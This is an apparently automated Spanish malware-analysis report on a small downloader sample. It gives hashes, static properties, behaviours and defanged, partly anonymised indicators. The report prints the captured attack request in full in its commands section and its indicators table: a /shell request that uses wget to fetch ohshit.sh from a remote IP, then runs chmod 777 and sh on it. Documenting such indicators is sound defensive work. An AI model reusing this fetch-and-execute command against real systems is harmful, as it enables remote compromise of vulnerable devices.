# 🧬 Payload Analysis

`6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c`

## 📌 Resumen

Texto ASCII de 426 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `ohshit.sh` en `hxxp://94.154.43.XXX:8080/ohshit.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod 777 /tmp/ohshit.sh`
2. `sh /tmp/ohshit.sh HTTP/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c.md](../../../../../malware-like/oraculo/downloader/6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:38:25.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c`
- **MD5:** `cca3ea8d5b51fe03cab4cb648ace4838`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 426 B |
| Entropía | 5.3 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /shell?wget hxxp://94.154.43.XXX:8080/ohshit.sh -O /tmp/ohshit.sh; chmod 777 /tmp/ohshit.sh; sh /tmp/ohshit.sh HTTP/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://94.154.43.XXX:8080/ohshit.sh | strings |
| ip | 190.179.175.XXX | static_analysis |
| ip | 94.154.43.XXX | static_analysis |
| command | GET /shell?wget hxxp://94.154.43.XXX:8080/ohshit.sh -O /tmp/ohshit.sh; chmod 777 /tmp/ohshit.sh; sh /tmp/ohshit.sh HTTP/ | strings |
| hash | 6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
